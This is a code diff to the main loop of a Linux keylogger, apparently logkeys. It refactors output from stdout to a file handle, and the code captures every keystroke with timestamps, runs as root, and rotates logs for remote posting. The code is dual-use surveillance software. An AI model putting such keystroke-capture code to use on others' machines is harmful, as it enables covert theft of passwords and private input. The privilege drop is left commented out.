@@ -408,7 +408,6 @@ int main(int argc, char **argv)
   
   // check for incompatible flags
   if (!args.keymap.empty() && (!(args.flags & FLAG_EXPORT_KEYMAP) && args.us_keymap)) {  // exporting uses args.keymap also
-    
     error(EXIT_FAILURE, 0, "Incompatible flags '-m' and '-u'. See usage.");
   }
   
@@ -455,19 +454,18 @@ int main(int argc, char **argv)
     setegid(getgid());
   }
   
-  // open log file as stdout (if file doesn't exist, create it with safe 0600 permissions)
+  // open log file (if file doesn't exist, create it with safe 0600 permissions)
   umask(0177);
-  stdout = freopen(args.logfile.c_str(), "a", stdout);
-  if (stdout == NULL)
+  FILE *out = fopen(args.logfile.c_str(), "a");
+  if (!out)
     error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.logfile.c_str());
   
   // now we need those privileges back in order to create system-wide PID_FILE
   seteuid(0); setegid(0);
-  
   create_PID_file();
   
   // now we've got everything we need, finally drop privileges by becoming 'nobody'
-  //setegid(65534); seteuid(65534);
+  //setegid(65534); seteuid(65534);   // commented-out, I forgot why xD
   
   unsigned int scan_code, prev_code = 0;  // the key code of the pressed key (some codes are from "scan code set 1", some are different (see <linux/input.h>)
   struct input_event event;
@@ -475,7 +473,7 @@ int main(int argc, char **argv)
   bool shift_in_effect = false;
   bool altgr_in_effect = false;
   bool ctrl_in_effect = false;  // used for identifying Ctrl+C / Ctrl+D
-  int count_repeats = 0;  // count_repeats differs from the actual number of repeated characters!! only the OS knows how these two values are related (by respecting configured repeat speed and delay)
+  int count_repeats = 0;  // count_repeats differs from the actual number of repeated characters! afaik, only the OS knows how these two values are related (by respecting configured repeat speed and delay)
   
   struct stat st;
   stat(args.logfile.c_str(), &st);
@@ -488,10 +486,10 @@ int main(int argc, char **argv)
   strftime(timestamp, sizeof(timestamp), TIME_FORMAT, localtime(&cur_time));
   
   if (args.flags & FLAG_NO_TIMESTAMPS)
-    file_size += fprintf(stdout, "Logging started at %s\n\n", timestamp);
+    file_size += fprintf(out, "Logging started at %s\n\n", timestamp);
   else
-    file_size += fprintf(stdout, "Logging started ...\n\n%s", timestamp);
-  fflush(stdout);
+    file_size += fprintf(out, "Logging started ...\n\n%s", timestamp);
+  fflush(out);
   
   // infinite loop: exit gracefully by receiving SIGHUP, SIGINT or SIGTERM (of which handler closes input_fd)
   while (read(input_fd, &event, sizeof(struct input_event)) > 0) {
@@ -507,14 +505,14 @@ int main(int argc, char **argv)
     scan_code = event.code;
     
     if (scan_code >= sizeof(char_or_func)) {  // keycode out of range, log error
-      inc_size += fprintf(stdout, "<E-%x>", scan_code);
+      inc_size += fprintf(out, "<E-%x>", scan_code);
       if (inc_size > 0) file_size += inc_size;
       continue;
     }
     
     // if remote posting is enabled and size treshold is reached
     if (args.post_size != 0 && file_size >= args.post_size && stat(UPLOADER_PID_FILE, &st) == -1) {
-      fclose(stdout);
+      fclose(out);
       
       std::stringstream ss;
       for (int i = 1;; ++i) {
@@ -527,8 +525,8 @@ int main(int argc, char **argv)
       if (rename(args.logfile.c_str(), ss.str().c_str()) == -1)  // move current log file to indexed
         error(EXIT_FAILURE, errno, "Error renaming logfile");
       
-      stdout = fopen(args.logfile.c_str(), "a");  // open empty log file with the same name
-      if (stdout == NULL)
+      out = fopen(args.logfile.c_str(), "a");  // open empty log file with the same name
+      if (!out)
         error(EXIT_FAILURE, errno, "Error opening output file '%s'", args.logfile.c_str());
       
       file_size = 0;  // new log file is now empty
@@ -552,7 +550,7 @@ int main(int argc, char **argv)
           prev_code == KEY_LEFTSHIFT  || prev_code == KEY_RIGHTCTRL);  // if repeated key is modifier, do nothing
       else {
         if ((args.flags & FLAG_NO_FUNC_KEYS) && is_func_key(prev_code));  // if repeated was function key, and if we don't log function keys, then don't log repeat either
-        else inc_size += fprintf(stdout, "<#+%d>", count_repeats);
+        else inc_size += fprintf(out, "<#+%d>", count_repeats);
       }
       count_repeats = 0;  // reset count for future use
     }
@@ -564,12 +562,12 @@ int main(int argc, char **argv)
       if (scan_code == KEY_ENTER || scan_code == KEY_KPENTER ||
           (ctrl_in_effect && (scan_code == KEY_C || scan_code == KEY_D))) {
         if (ctrl_in_effect)
-          inc_size += fprintf(stdout, "%lc", char_keys[to_char_keys_index(scan_code)]);  // log C or D
+          inc_size += fprintf(out, "%lc", char_keys[to_char_keys_index(scan_code)]);  // log C or D
         if (args.flags & FLAG_NO_TIMESTAMPS)
-          inc_size += fprintf(stdout, "\n");
+          inc_size += fprintf(out, "\n");
         else {
           strftime(timestamp, sizeof(timestamp), "\n" TIME_FORMAT, localtime(&event.time.tv_sec));
-          inc_size += fprintf(stdout, "%s", timestamp);  // then newline and timestamp
+          inc_size += fprintf(out, "%s", timestamp);  // then newline and timestamp
         }
         if (inc_size > 0) file_size += inc_size;
         continue;  // but don't log "<Enter>"
@@ -602,17 +600,17 @@ int main(int argc, char **argv)
         else  // neither altgr nor shift are effective, this is a normal char
           wch = char_keys[to_char_keys_index(scan_code)];
         
-        if (wch != L'\0') inc_size += fprintf(stdout, "%lc", wch);  // write character to log file
+        if (wch != L'\0') inc_size += fprintf(out, "%lc", wch);  // write character to log file
       }
       else if (is_func_key(scan_code)) {
         if (!(args.flags & FLAG_NO_FUNC_KEYS)) {  // only log function keys if --no-func-keys not requested
-          inc_size += fprintf(stdout, "%ls", func_keys[to_func_keys_index(scan_code)]);
+          inc_size += fprintf(out, "%ls", func_keys[to_func_keys_index(scan_code)]);
         } 
         else if (scan_code == KEY_SPACE || scan_code == KEY_TAB) {
-          inc_size += fprintf(stdout, " ");  // but always log a single space for Space and Tab keys
+          inc_size += fprintf(out, " ");  // but always log a single space for Space and Tab keys
         }
       }
-      else inc_size += fprintf(stdout, "<E-%x>", scan_code);  // keycode is neither of character nor function, log error
+      else inc_size += fprintf(out, "<E-%x>", scan_code);  // keycode is neither of character nor function, log error
     } // if (EV_MAKE)
     
     // on key release
@@ -626,7 +624,7 @@ int main(int argc, char **argv)
     }
     
     prev_code = scan_code;
-    fflush(stdout);
+    fflush(out);
     if (inc_size > 0) file_size += inc_size;
     
   } // while (read(input_fd))
@@ -634,9 +632,9 @@ int main(int argc, char **argv)
   // append final timestamp, close files and exit
   time(&cur_time);
   strftime(timestamp, sizeof(timestamp), "%F %T%z", localtime(&cur_time));
-  fprintf(stdout, "\n\nLogging stopped at %s\n\n", timestamp);
+  fprintf(out, "\n\nLogging stopped at %s\n\n", timestamp);
   
-  fclose(stdout);
+  fclose(out);
   
   remove(PID_FILE);
   
